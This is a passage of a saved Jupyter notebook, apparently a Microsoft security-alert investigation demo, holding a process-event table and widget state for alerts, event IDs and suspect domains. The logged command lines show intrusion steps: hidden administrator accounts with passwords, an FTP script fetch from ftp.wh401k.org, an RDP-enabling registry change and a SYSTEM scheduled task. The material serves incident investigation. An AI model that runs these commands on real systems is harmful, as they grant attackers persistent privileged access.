C:\\Windows\\System32\\net.exe   \n20737       C:\\Windows\\System32\\net.exe   \n20738       C:\\Windows\\System32\\net.exe   \n20739      C:\\Windows\\System32\\net1.exe   \n20740      C:\\Windows\\System32\\net1.exe   \n20741      C:\\Windows\\System32\\net1.exe   \n20742      C:\\Windows\\System32\\net1.exe   \n20743   C:\\Windows\\System32\\findstr.exe   \n20744       C:\\Windows\\System32\\net.exe   \n20745      C:\\Windows\\System32\\net1.exe   \n20746       C:\\W!ndows\\System32\\reg.exe   \n20747  C:\\Windows\\System32\\schtasks.exe   \n20748      C:\\Windows\\System32\\PING.EXE   \n\n                                                                                               CommandLine  \\\n14683                                              \\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1   \n20175                                                               cmd  /c echo Begin Security Demo tasks   \n20176                                                                 cmd  /c echo End Security Demo tasks   \n20189               cmd  /c echo Any questions about the commands executed here then please contact one of   \n20197                        cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com   \n20692                                                                                          net  users    \n20696                                                                     C:\\Windows\\system32\\net1  users    \n20714                                                                    net  user abai$ Wf9k44_9d[=$ /add   \n20715                                                                  net  user www.401hk.com /active:yes   \n20718                                               C:\\Windows\\system32\\net1  user abai$ Wf9k44_9d[=$ /add   \n20719                                             C:\\Windows\\system32\\net1  user www.401hk.com /active:yes   \n20724                                                                    cmd  /c echo open ftp.wh401k.org    \n20725                                                                                     ftp  -s:MG06.dll   \n20726                                         cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F   \n20727                                                                                     findstr  \"abai$\"   \n20729                                                                         net  user abai$ Wf9k44_9d[=$   \n20730                                                                              net  user abai$ /delete   \n20731                                                    C:\\Windows\\system32\\net1  user abai$ Wf9k44_9d[=$   \n20732                                                         C:\\Windows\\system32\\net1  user abai$ /delete   \n20733                                                                      net  localgroup administrators    \n20734                                                 C:\\Windows\\system32\\net1  localgroup administrators    \n20735                                                            net  localgroup administrators abai$ /add   \n20736                                                            net  user www.401hk.com Wf9k44_sinc9d3[=$   \n20737                                                         net  localgroup administrators abai$ /delete   \n20738                                                                      net  user www.401hk.com /delete   \n20739                                       C:\\Windows\\system32\\net1  localgroup administrators abai$ /add   \n20740                                       C:\\Windows\\system32\\net1  user www.401hk.com Wf9k44_sinc9d3[=$   \n20741                                    C:\\Windows\\system32\\net1  localgroup administrators abai$ /delete   \n20742                                                 C:\\Windows\\system32\\net1  user www.401hk.com /delete   \n20743                                                                             findstr  \"www.401hk.com\"   \n20744                                                            net  user www.401hk.com Wf9k44_9d[=$ /add   \n20745                                       C:\\Windows\\system32\\net1  user www.401hk.com Wf9k44_9d[=$ /add   \n20746  reg  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DW...   \n20747                   schtasks.exe  /create /tn  /tr \"c:\\pagefile.exe /?\" /sc hour /mo 1 /ru \"system\" /f   \n20748                                                                              ping  127.0.0.1 -n 100    \n\n      SubjectLogonId  ClusterSize  \n14683      0xbd57571           17  \n20175      0xbd57571           18  \n20176      0xbd57571           18  \n20189      0xbd57571            8  \n20197      0xbd57571            8  \n20692      0xbd57571            4  \n20696      0xbd57571            4  \n20714      0xbd57571            4  \n20715      0xbd57571            4  \n20718      0xbd57571            4  \n20719      0xbd57571            4  \n20724      0xbd57571            1  \n20725      0xbd57571            1  \n20726      0xbd57571            1  \n20727      0xbd57571            2  \n20729      0xbd57571            2  \n20730      0xbd57571            2  \n20731      0xbd57571            2  \n20732      0xbd57571            2  \n20733      0xbd57571            1  \n20734      0xbd57571            1  \n20735      0xbd57571            4  \n20736      0xbd57571            4  \n20737      0xbd57571            4  \n20738      0xbd57571            4  \n20739      0xbd57571            4  \n20740      0xbd57571            4  \n20741      0xbd57571            4  \n20742      0xbd57571            4  \n20743      0xbd57571            1  \n20744      0xbd57571            1  \n20745      0xbd57571            1  \n20746      0xbd57571            1  \n20747      0xbd57571            1  \n20748      0xbd57571            1  "
         },
         "metadata": {},
         "output_type": "display_data"
        }
       ]
      }
     },
     "5cf70822dd3f4e58b3d45d7662e3fba6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "5d3542002e0a493c9326fb2d0266bf63": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter:",
       "layout": "IPY_MODEL_d613c06f3eb84dc1924f7044c0cdf10d",
       "style": "IPY_MODEL_028317534f634339bbdb8a7f0d49b37c"
      }
     },
     "5e0a8a925b1b44c78ecbddb952854798": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "5fc4c7a20f3a4161b95b8ff1362b9a03": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "5fdbbe59702149c29ba4aef74b95f10a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter:",
       "layout": "IPY_MODEL_ec0eab94d292422984ac46ff19c33f34",
       "style": "IPY_MODEL_12be7e2fe71f4993bbf37c201caac2b3"
      }
     },
     "5fdfda0a8882455e945ca322029be6fe": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "4720: A user account was created. ",
        "4722: A user account was enabled. ",
        "4724: An attempt was made to reset an account's password. ",
        "4726: A user account was deleted. ",
        "4728: A member was added to a security-enabled global group. ",
        "4729: A member was removed from a security-enabled global group. ",
        "4732: A member was added to a security-enabled local group. ",
        "4733: A member was removed from a security-enabled local group. ",
        "4738: A user account was changed. "
       ],
       "description": "Selected: ",
       "index": [],
       "layout": "IPY_MODEL_2e9ee84e6e834fa59907b388a3d3bc77",
       "rows": 5,
       "style": "IPY_MODEL_b7fa34a6681c42dd95ab16f4781b3ca7"
      }
     },
     "5ffe5a802d874b27b2c460f92071123b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "CheckboxModel",
      "state": {
       "description": "View All Processes (Show clustered only if not checked)",
       "disabled": false,
       "layout": "IPY_MODEL_faf8048b3b904576bcb815288a03c562",
       "style": "IPY_MODEL_894ae1e5286649ddaa1e2487a42d6ec0",
       "value": false
      }
     },
     "62232bd3259840378d11449515c56b6b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "62aa1ffa74ba4878bb25915f435e281e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "6316fbd42bb84e26979f482006a682a7": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "638f829494744c738a6e92fedf6a1154": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "63edb5f031f84d89830b6d2a2fb2ec93": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "4720: A user account was created. ",
        "4722: A user account was enabled. ",
        "4724: An attempt was made to reset an account's password. ",
        "4726: A user account was deleted. ",
        "4728: A member was added to a security-enabled global group. ",
        "4729: A member was removed from a security-enabled global group. ",
        "4732: A member was added to a security-enabled local group. ",
        "4733: A member was removed from a security-enabled local group. ",
        "4738: A user account was changed. "
       ],
       "description": "Source: ",
       "index": [],
       "layout": "IPY_MODEL_2e9ee84e6e834fa59907b388a3d3bc77",
       "rows": 5,
       "style": "IPY_MODEL_4e68cdaca5614fe4b17ba36ad51e69b4"
      }
     },
     "63fc703b33614525bba2293fffac6f2d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "653e42867a08447ca4a7fea721d500b5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_84059b2f4f654998b5902ec6f7fb2e06",
        "IPY_MODEL_57766e5d8e314d1188554b3fb1d0c1df"
       ],
       "layout": "IPY_MODEL_6d79480c601f43ecb3bab5565c432e72"
      }
     },
     "662f3c7fd3444eed97ecad9b895c8c1a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "2019-02-12 11:48:01  Security incident with shared process detected (MSTICAlertsWin1) [id:2518523287189999999_1f19db0b-3d5b-4f7b-b91f-5e994ba4bde5]",
        "2019-02-13 22:03:42  Suspiciously named process detected (MSTICAlertsWin1) [id:2518522053771835343_649075c9-dc5d-4a75-a848-9c51f70a45ae]",
        "2019-02-13 22:03:42  Digital currency mining related behavior detected (MSTICAlertsWin1) [id:2518522053771835343_cf383339-b4ff-4996-9d4e-83a4ece6688f]",
        "2019-02-13 23:07:24  Detected the disabling of critical services (MSTICAlertsWin1) [id:2518522015556924218_856f3dbd-ca72-474d-ab00-75956b161a02]",
        "2019-02-13 23:07:24  Detected potentially suspicious use of Telegram tool (MSTICAlertsWin1) [id:2518522015557283714_a1008225-c62f-4f51-84aa-6aad89a02b3a]",
        "2019-02-14 11:51:38  Security incident detected (MSTICAlertsWin1) [id:2518521557015111330_79f27254-e85f-4471-a061-3ea99b824495]",
        "2019-02-14 11:51:38  Suspicious system process executed (MSTICAlertsWin1) [id:2518521557015111330_65a3fe73-0832-427a-aab3-06edc2c27f0a]",
        "2019-02-14 11:51:38  Potential attempt to bypass AppLocker detected (MSTICAlertsWin1) [id:2518521557014927413_daa18e53-ab1d-4d7d-8c4f-bcb86f75fd5f]",
        "2019-02-15 19:55:10  Suspicious Activity Detected (MSTICAlertsWin1) [id:2518520402897969999_b946cd89-667e-4ce7-b571-9603859a7234]"
       ],
       "description": "Select alert :",
       "index": 7,
       "layout": "IPY_MODEL_ed1769e3307f458090aaab27e5450836",
       "style": "IPY_MODEL_94843c6079074222b2392a575a1b340e"
      }
     },
     "6873ecd8427c4c2591dacab099e3b0cc": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "6961b754222f46f4a83dc2fbf1ac42ac": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "69dac1d5821a4bd2adb96c40a74bf06c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "69dafe7021ba41bab5239278d40a0f1d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "6a3605eba2ec4f6e9970489cce005248": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "6b941172e6c84ea18d6aeffad725e63d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "6bc8292ca3674e8bbc745242d5514c7a": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "80%"
      }
     },
     "6c2ed05634d847d0a503b9ce585e3ba5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_9f14a2f1c8e54274b12f3529191bc92b",
       "style": "IPY_MODEL_6961b754222f46f4a83dc2fbf1ac42ac",
       "value": "2019-02-14 12:32:50.220000"
      }
     },
     "6d79480c601f43ecb3bab5565c432e72": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "6d7efd5f1a5042abb84e91032094d96b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "6ec051181bb94c888c6b101d8672cea1": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "7162a226093945808a401b8746fee2e7": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "722d6ef1266046ad93ceede2978fdbf8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add ⇾",
       "layout": "IPY_MODEL_93b64f6de84e443bbbd33b0dedb3a038",
       "style": "IPY_MODEL_638f829494744c738a6e92fedf6a1154"
      }
     },
     "725e337f1aad4580b40c1dd1884fb973": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_7295a6afa25a443aae2dec80f00abbfa",
        "IPY_MODEL_f40df6a3f0754fe8af2a97a4d8626a8a",
        "IPY_MODEL_5b6148668ec245d1b38a6027f08b65ae"
       ],
       "layout": "IPY_MODEL_2549f58d87bc4a6c9fd035c1dedcff31"
      }
     },
     "7295a6afa25a443aae2dec80f00abbfa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter:",
       "layout": "IPY_MODEL_2f9599f3732741d78f8a451140a8397f",
       "style": "IPY_MODEL_42d783a722e9479f9439d2f612082ad8"
      }
     },
     "72c38d382eb2437ba4d3265b71ddafb6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "745825489cc14817bf6ebe771608c462": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_87b9a97272c34c02a1615acdb1e89b3d",
        "IPY_MODEL_82953f8fab5d477fac167d0499c1907e"
       ],
       "layout": "IPY_MODEL_c3c892a34ca840ab8bafdde96dda90d0"
      }
     },
     "747fe41e41824498a0f5e532d037f664": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "760346d059ee4a569cdb2e5fbfdb67eb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove",
       "layout": "IPY_MODEL_01072e2a14c54b2f8681bd8e7563030c",
       "style": "IPY_MODEL_de9a4ecb8585451ba8ec871dce4de05c"
      }
     },
     "7681be41c5fb493b872af664d1e02305": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "7729c284fdfd41b3870789550e0b5b46": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "772b1ec46fb144fd93dc475f44e0503b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_9c41e261f7434f7994dfe38167334167",
       "style": "IPY_MODEL_c5fe0ac9e5c5445c9205e622260c2eba",
       "value": "19:04:00.244055"
      }
     },
     "792a0afe4cae4e38a9ff8a10af4f42e7": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "79967f1b183646a69edc2acbf06bf8e7": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "79a04d880a104b26b354b90b3fddd5af": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "79a6985af45140dc8cdcd6c43dd68370": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add All ⇾",
       "layout": "IPY_MODEL_26db45a6b40f429b908fd3c825b8f0e6",
       "style": "IPY_MODEL_87fd4a8f255d464eab2711a8ad50ba68"
      }
     },
     "7a159bb041724c4fbd4e965a018e7198": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove",
       "layout": "IPY_MODEL_295dab2306b744248315afd5ae1a20c6",
       "style": "IPY_MODEL_6ec051181bb94c888c6b101d8672cea1"
      }
     },
     "7b9520e510c646c0a8eb672332dda8da": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "7bad741963b1454eb19d30ac81f86307": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "80%"
      }
     },
     "7bd4f4bc359b44e382223393f1994374": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "7cbcf6ab9c9f4511b4838c422230bdee": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "7fdab0e2480b460abe23517404343c48": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "82953f8fab5d477fac167d0499c1907e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_c4720d1af0394739bac70fe918b16b8e",
       "style": "IPY_MODEL_d9f389d015a84c7b9e30a0182368e5ab",
       "value": "19:04:00.244055"
      }
     },
     "84059b2f4f654998b5902ec6f7fb2e06": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Filter:",
       "layout": "IPY_MODEL_ffff872262834fcda1ed72ace0dd23d0",
       "style": "IPY_MODEL_9f35693cb9b644ab967d4acdee79ec61"
      }
     },
     "87b9a97272c34c02a1615acdb1e89b3d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_fb5db673530541e39973351a79bedd5c",
       "style": "IPY_MODEL_10b0a37aa2274b50b7e52e6520900c20",
       "value": {
        "date": 18,
        "month": 1,
        "year": 2019
       }
      }
     },
     "87f58248b8e3471289e050ccc3e4446f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove All",
       "layout": "IPY_MODEL_4eef56d2f8c94176af3da2610d0c5c3c",
       "style": "IPY_MODEL_8a7b10a3e4e74ed5bbaea18e9bacf999"
      }
     },
     "87fd4a8f255d464eab2711a8ad50ba68": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "881af16289004ba697d7907eaa6c6f0b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_4accbb3de0464027af1704a318488c24",
       "style": "IPY_MODEL_57701cdda7d74a9582df445479713a9a",
       "value": "2019-02-09 11:52:06"
      }
     },
     "894ae1e5286649ddaa1e2487a42d6ec0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "8a3157bd1dcb415f8dc43557aeab3c33": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_9d7c6026399e44aabbe9c1c3ec7b2ca7",
        "IPY_MODEL_52b9de20ae1e49bebbf5a1c3bd6a36c9",
        "IPY_MODEL_e3577780a8134faf9511219791493a25"
       ],
       "layout": "IPY_MODEL_9c0793ac20b94267a5359dfd421560e7"
      }
     },
     "8a7b10a3e4e74ed5bbaea18e9bacf999": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "8b0d9225cb1c435799c8826a09fdcb56": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "8b8d2d81de054ca7b2049f83032a1119": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "8b9b66d40858428aa8624a7bf797969e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "8bd81de6407f4c84b39f9844a8da998b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "8d5cd20bd4904e08b329de7fa61d317c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_af96783e914c45c08ac489c564b63b07",
        "IPY_MODEL_aadad8f762a949aca8b87333a7088524",
        "IPY_MODEL_00c22d420eb14ddcb896345c45e8cae6",
        "IPY_MODEL_e97b6518b3ed460eba8e55e58c27e42d"
       ],
       "layout": "IPY_MODEL_5e0a8a925b1b44c78ecbddb952854798"
      }
     },
     "8eeec73ef226495f99c3c89fd34e6055": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_9be5ec949d774ab5aee234dc1cc26630",
       "style": "IPY_MODEL_6d7efd5f1a5042abb84e91032094d96b",
       "value": "<h4>Set time bounds for network queries</h4>"
      }
     },
     "8f00f66355dc450189a6cb877f7e9c13": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "ftp.wh401k.org",
        "www.401hk.com"
       ],
       "description": "Selected: ",
       "index": [
        1
       ],
       "layout": "IPY_MODEL_409d35d2dcf24960a239711a8bd27f0f",
       "rows": 5,
       "style": "IPY_MODEL_12ee50ab36e44abc89c30d3db8631a27"
      }
     },
     "8f609132c4734e0f8c445ffb5e70568e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "90880e712e554e70bbe29c070477e42a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (hour):",
       "layout": "IPY_MODEL_6bc8292ca3674e8bbc745242d5514c7a",
       "max": 165,
       "min": -20,
       "style": "IPY_MODEL_55b212b9043f4431be4d7aa1fe162740",
       "value": [
        -1,
        145
       ]
      }
     },
     "9124bb2fddfa4b9fa87902de2492b4fe": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "91bb52db7bd840be8bb695554eb2a290": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_9ecff56fd03a491e8f2a795d7152753c",
        "IPY_MODEL_449a40de45fc41b3ac3615ffae8376f6"
       ],
       "layout": "IPY_MODEL_e6aab38463c540a1abfe0aa8138c03fe"
      }
     },
     "91cdff723330465fa16da6c9271e4430": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "layout": "IPY_MODEL_b183a63f471a475aae2f01235c6cc496",
       "max": 5,
       "min": -28,
       "style": "IPY_MODEL_1e9fe74496ee46e5885db13fe316d835",
       "value": [
        -5,
        5
       ]
      }
     },
     "9215b6ffcda045c88382c06111b24d3b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add All ⇾",
       "layout": "IPY_MODEL_f75df425ed044a4585bbe7587d662984",
       "style": "IPY_MODEL_3d6a7a39288843bebb5f6126f960dcb7"
      }
     },
     "923f90a16b0a4260a5a76967a69c73e9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "93b64f6de84e443bbbd33b0dedb3a038": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "947daa33e9c345ac9308de41777c9b57": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "94843c6079074222b2392a575a1b340e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "953977c100b34b77959a4e5c3b9c0038": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "127.0.0.1",
        "ftp.wh401k.org",
        "microsoft.com",
        "www.401hk.com"
       ],
       "description": "Source: ",
       "index": [],
       "layout": "IPY_MODEL_409d35d2dcf24960a239711a8bd27f0f",
       "rows": 5,
       "style": "IPY_MODEL_8b8d2d81de054ca7b2049f83032a1119"
      }
     },
     "959586dcc3954050830a8e87bd534f7d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_9215b6ffcda045c88382c06111b24d3b",
        "IPY_MODEL_df41cb69cea249ac9fcbb0b590e83bb3",
        "IPY_MODEL_760346d059ee4a569cdb2e5fbfdb67eb",
        "IPY_MODEL_95db57782112427c9464a8a538e1bf67"
       ],
       "layout": "IPY_MODEL_faf921499b4e43cfb132bdb39ea59095"
      }
     },
     "95db57782112427c9464a8a538e1bf67": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove All",
       "layout": "IPY_MODEL_c7cb1e92c6094286a6a8da5f78c0ab11",
       "style": "IPY_MODEL_bbf4a02ee4c54ae2b51c1eeb387ac2dd"
      }
     },
     "9682fd38ea534559ba2dee092d4a265f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "97199b8228444ce482fef2e7c4046b36": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "200px",
       "width": "100%"
      }
     },
     "991db46ddd6e4b3bba9f9716bf7a2704": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "9a90a1e9ebec43bda086520d352c1524": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "9b9b76920d534c35a5c5e72e8c646567": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "9be5ec949d774ab5aee234dc1cc26630": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "9bee161348d644a59e978e2d647ba83b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_031540bc4553409ba12c9fcd44a1d5a3",
        "IPY_MODEL_881af16289004ba697d7907eaa6c6f0b",
        "IPY_MODEL_0122ae93d43c4e4b93b087de541f2990"
       ],
       "layout": "IPY_MODEL_f2150c20a2794e8bad6e6c2995318098"
      }
     },
     "9c0793ac20b94267a5359dfd421560e7": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "9c41e261f7434f7994dfe38167334167": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "9ce8e91ad66e49f090fc3ac0e1bbe728": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "9d6a90edf56f426fa60ff47cb522d28e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
